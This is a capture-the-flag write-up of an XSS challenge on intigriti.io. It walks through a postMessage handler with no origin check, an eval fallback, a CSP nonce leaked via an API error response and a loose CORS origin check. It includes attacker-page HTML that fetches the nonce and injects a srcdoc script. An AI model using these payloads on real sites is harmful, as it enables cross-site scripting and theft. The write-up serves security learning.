```
function buttonClick() {
        if (document.querySelector('#question').value){
          document.querySelector('#ball').contentWindow.postMessage({
            question: document.querySelector('#question').value
          }, '*');
        }
      }

      addEventListener('message', e => {
        switch(e.data.action){
          case 'set':
            [...document.querySelectorAll(e.data.element)].forEach(s => s.setAttribute(e.data.attr, e.data.value));
            break;
          case 'delete':
            [...document.querySelectorAll(e.data.element)].forEach(s => s.removeAttribute(e.data.attr, e.data.value));
            break;
          case 'get':
            [...document.querySelectorAll(e.data.element)].forEach(s => s.getAttribute(e.data.attr, e.data.value));
            break;
          case 'count':
            [...document.querySelectorAll(e.data.element)].length;
            break;
          case 'result':
            document.querySelector('#answer').innerHTML = e.data.value.replace(/<|>/g,'');
            break;
          default:
            console.log(e.data);
        }
      });
```
+ When we ask a question, it sends a postMessage to the ball iframe, then that iframe will send back some message. Looking at the source code of that iframe,
```

      function rand(){
        return ~~(Math.random() * 30) - 15;
      }
      function shake(resp){
        let c = 10;
        let stop = setInterval(_ => {
          c--;
          if (c){
            top.postMessage({
              action: 'set',
              element: '#ball',
              attr: 'style',
              value: 'left: ' + rand() + 'px; top: ' + rand() + 'px;'
            }, '*');
          } else {
            top.postMessage({
              action: 'result',
              value: resp.answer
            }, '*');
            clearInterval(stop);
          }
        }, 50);
      }
      addEventListener('message', e => {
        if ('question' in Object(e.data)){
          fetch('https://challenge-0922.intigriti.io/challenge/api.php?question=' + encodeURIComponent(e.data.question))
            .then(e => e.text())
            .then(e => {
              let resp;
              try{
                resp = JSON.parse(e);
              } catch (_) {
                resp = eval(e);
              }
              shake(resp);
          });
        }
      });
```
+ Looking at the documentation of postMessage, we can see that the arguements of the postmessage is message and targetOrigin. In the above code, we can see that the target origin is given as "*" astericks. Which means that they dont really checks when the question is coming from. Putting astericks means it doesnt have a preference of from where the message comes from.
+ The origin is not checked when we receive this message, so the origin can come from anywhere. So, we can host a page and send these messages.
+ So, lets host an html page as follows:
```
<!DOCTYPE html>
<iframe id="challenge" src="https://challenge-0922.intigriti.io/challenge/index.php" onload="sendMessage()"></iframe>
<script>
    function sendMessage(nounce){
        let challenge=document.getElementById('challenge');
        challenge.contentWindow.postMessage({
            action:'result',
            value: 'testresult'
        },'*');
    }
</script>
```
+ but didnt work as expected because of the following code:
```

      fetch('https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.2.0/css/bootstrap.min.css')
        .then(e=>e.text())
        .then(e=>{
          let url = URL.createObjectURL(new Blob([e], {type : 'text/css'}));
          let el = this.document.createElement('link');
          el.setAttribute('rel', 'stylesheet');
          el.setAttribute('type', 'text/css');
          el.setAttribute('href', url);
          document.querySelector('head').appendChild(el);
        });

      window.addEventListener('message', e => {
        if (e.source !== document.querySelector('#ball').contentWindow){
          e.stopImmediatePropagation();
        }
      });

```
+ The above code sets another listener for our message, it checks if the source is not our ball iframe, so, the second event listener in our above case wont get it.
+ As of now, we only tried the result part of the event listener. Looking at the set case,it takes an element and set it with an attribute, to try out using set, we can chenge the code of our page as follows:
```
<!DOCTYPE html>
<iframe id="challenge" src="https://challenge-0922.intigriti.io/challenge/index.php" onload="sendMessage()"></iframe>
<script>
    function sendMessage(nounce){
        let challenge=document.getElementById('challenge');
        challenge.contentWindow.postMessage({
            action:'set',
            element: '#ball',
            attr: 'srcdoc',
            value: '<script>alert(document.domain)<\/script>'
        },'*');
    }
</script>
```
+ When we reload the script, we can see that the webpage is not a ball anymore,but the srcdoc has been set in the iframe but it doesnt work anyomore
+ lets loook at the csp:
    `<meta http-equiv="Content-Security-Policy" content="default-src 'self' blob: 'unsafe-inline' challenge-0922.intigriti.io; script-src 'nonce-2e59cb646b6b35a25e349525b60befd'; connect-src https:; object-src 'none'; base-uri 'none';">`
![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/a6cdada9-3d24-4d21-b2bc-06c08c6d3d3e)
but the csp doesnt seem to have any problems.
+ We need to guess the nounce inorder to continue, but the nounce are not really guessable.
+ Now lets look at the network tab. When I ask a question, it makes a request to an API.
+ Lets just visit api.php removing the question parameter to see what happens and we got this:
![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/1f6164ff-4c82-4ec9-a515-90b3221b52a7)
+ And there we can see that there is a value that starts with `ey`. Base64 json usually starts with eyj. Lets base64 decode it see what it really is.
+ After base64 decoding and beautifying it we get the followjng:
![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/2fa4fe4d-c4ea-46ac-8c24-dbf87f561fab)
+ We can see a value with the name csp. If we compare it with the nounce in our csp it is the same. So, the error message basically leaks the nounce.
+ If we get the nounce, we can supply it to the script element thus bypass the csp.
+ We modified the code for our page as follows:
```
<iframe id="challenge" src="https://challenge-0922.intigriti.io/challenge/index.php" onload="sendMessage()"></iframe>
<script>
    function getNounce(){
        fetch("https://challenge-0922.intigriti.io/challenge/api.php")
        .then(res=>res.text())
        .then(res=>{
            console.log(res);
            const token=res.match(/eyJ[\w\d\/\+=]+/)[0];
            const obj=JSON.parse(atob(token));
            const nounce=obj.csp;
            console.log(nounce);
            sendMessage(nounce);
        }).catch(console.error)
    }

    function sendMessage(nounce){
        let challenge=document.getElementById('challenge');
        challenge.contentWindow.postMessage({
            action:'set',
            element: '#ball',
            attr: 'srcdoc',
            value: '<script>alert(document.domain)<\/script>'
        },'*');
    }
</script>
```
+ When we console.log the response, we can see that we dont get the same base64 encoded string in the error page, this is because if we look at the response header of the api page from our localhost we can see that the following are the response headers:
![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/5af536f9-fe4c-46e1-92a6-a56ba4744273)
+ But when we send the request from https://challenge-0922.intigriti.io/, we have the following response headers:
![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/44196a22-af4b-41ed-8f53-19b162f7fd53)
+ We can see that when we send the request from th challenge.intigriti.io we can see a header called Access-control-allow-credentials, which is missing when we send the same request locally.
+ Read about the header here: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials
+ To sett the header locally we can do as follows:
![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/feb36396-252e-404f-9a45-bfe924685738)
But still it doesnt fix everything.
+ Lets look at burp:
+ Sending a normal request:
![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/bc4affc6-8a67-4230-8616-243aeedf0da1)
+ When we send with an origin: something, the access-control-allow-origin will change from all(*) to attacker.com and credentials headers wont be there
![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/12f19636-86c9-4945-8da9-9889555d062e)
+ If we set origin: challenge-0922.intigriti.io, we can see that access-control-allow-origin is set to that domain and we have the credentials.
![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/e15f2918-8992-4d30-ac6b-c1c3cd422cf0)
+ if we set origin: challenge-0922.intigriti.io.attacker.com, we can see that the access-control-allow-origin is set to that domaina and credentials to true, so somewhere the check done to assure that the domain is challenge-0922.intigriti.io but it doesnt check it only challenge-0922.intigriti.io.
+ modified script:
```
<iframe id="challenge" src="https://challenge-0922.intigriti.io/challenge/index.php" onload="getNonce()"></iframe>
<script>
    function getNonce(){
        fetch("https://challenge-0922.intigriti.io/challenge/api.php",{credentials:'include'})
        .then(res=>res.text())
        .then(res=>{
            console.log(res);
            const token=res.match(/eyJ[\w\d\/\+=]+/)[0];
            const obj=JSON.parse(atob(token));
            const nounce=obj.csp;
            console.log(nounce);
            sendMessage(nounce);
        }).catch(console.error)
    }

    function sendMessage(nonce){
        let challenge=document.getElementById('challenge');
        challenge.contentWindow.postMessage({
            action:'set',
            element: '#ball',
            attr: 'srcdoc',
            value: '<script>parent.alert(document.domain)<\/script>'
        },'*');
    }
</script>
```
+ Now we have an xss, but this was only possible because we set the condition as below in burp:
e.source == document.querySelector('#ball').contentWindow.
+ ![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/6be2fd9b-1748-4fbd-8d2f-8839b860ce8c)
this is the line that is blocking us from getting xss. 
